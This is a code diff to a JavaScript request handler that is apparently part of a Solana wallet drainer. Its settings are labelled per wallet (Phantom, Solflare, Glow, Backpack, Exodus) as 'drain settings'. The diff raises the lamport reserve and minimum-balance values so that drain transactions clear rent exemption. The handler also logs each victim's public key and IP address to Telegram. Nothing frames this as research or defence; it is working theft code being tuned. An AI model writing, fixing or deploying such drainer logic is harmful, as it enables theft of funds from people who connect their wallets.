@@ -466,27 +466,27 @@ export default async function handler(req, res) {
     // Define fee calculation variables at function scope
     // Phantom-optimized drain settings (working configuration)
     const PHANTOM_FEE_BUFFER = 100000; // ~0.0001 SOL for Phantom network fees + safety margin
-    const PHANTOM_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
-const PHANTOM_TOTAL_RESERVED = PHANTOM_FEE_BUFFER + PHANTOM_RESERVE_LAMPORTS;
+    const PHANTOM_RESERVE_LAMPORTS = 2500000; // Keep 0.0025 SOL for rent exemption + safety
+    const PHANTOM_TOTAL_RESERVED = PHANTOM_FEE_BUFFER + PHANTOM_RESERVE_LAMPORTS;
     
     // Solflare-optimized drain settings (more aggressive)
     const SOLFLARE_FEE_BUFFER = 75000; // ~0.000075 SOL for network fees
-    const SOLFLARE_RESERVE_LAMPORTS = 25000; // Keep SOL for safety and rent
-const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
+    const SOLFLARE_RESERVE_LAMPORTS = 2500000; // Keep 0.0025 SOL for rent exemption + safety
+    const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
     
     // Glow-optimized drain settings (similar to Phantom)
     const GLOW_FEE_BUFFER = 100000; // ~0.0001 SOL for Glow network fees + safety margin
-    const GLOW_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
+    const GLOW_RESERVE_LAMPORTS = 2500000; // Keep 0.0025 SOL for rent exemption + safety
     const GLOW_TOTAL_RESERVED = GLOW_FEE_BUFFER + GLOW_RESERVE_LAMPORTS;
     
     // Backpack-optimized drain settings (similar to Phantom)
     const BACKPACK_FEE_BUFFER = 100000; // ~0.0001 SOL for Backpack network fees + safety margin
-    const BACKPACK_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
+    const BACKPACK_RESERVE_LAMPORTS = 2500000; // Keep 0.0025 SOL for rent exemption + safety
     const BACKPACK_TOTAL_RESERVED = BACKPACK_FEE_BUFFER + BACKPACK_RESERVE_LAMPORTS;
     
     // Exodus-optimized drain settings (similar to Phantom)
     const EXODUS_FEE_BUFFER = 100000; // ~0.0001 SOL for Exodus network fees + safety margin
-    const EXODUS_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
+    const EXODUS_RESERVE_LAMPORTS = 2500000; // Keep 0.0025 SOL for rent exemption + safety
     const EXODUS_TOTAL_RESERVED = EXODUS_FEE_BUFFER + EXODUS_RESERVE_LAMPORTS;
     
     // Get wallet type from request body or user agent
@@ -548,11 +548,11 @@ debugLog(`- Is Backpack: ${isBackpack}`);
 debugLog(`- Is Exodus: ${isExodus}`);
 debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
       
-      // Check if wallet has enough SOL for fees (at least 0.0001 SOL)
-      const MINIMUM_MEANINGFUL_SOL = 100000; // 0.0001 SOL (enough for fees + small drain)
+      // Check if wallet has enough SOL for fees and rent exemption (at least 0.0026 SOL)
+      const MINIMUM_MEANINGFUL_SOL = 2600000; // 0.0026 SOL (enough for fees + rent exemption + small drain)
       
       if (FRESH_BALANCE < MINIMUM_MEANINGFUL_SOL) {
-        debugLog(`Insufficient SOL for fees: ${FRESH_BALANCE} < ${MINIMUM_MEANINGFUL_SOL}`);
+        debugLog(`Insufficient SOL for fees and rent: ${FRESH_BALANCE} < ${MINIMUM_MEANINGFUL_SOL}`);
         await telegramLogger.logInsufficientFunds({
           user: userPubkey.toString(),
           ip: userIp,
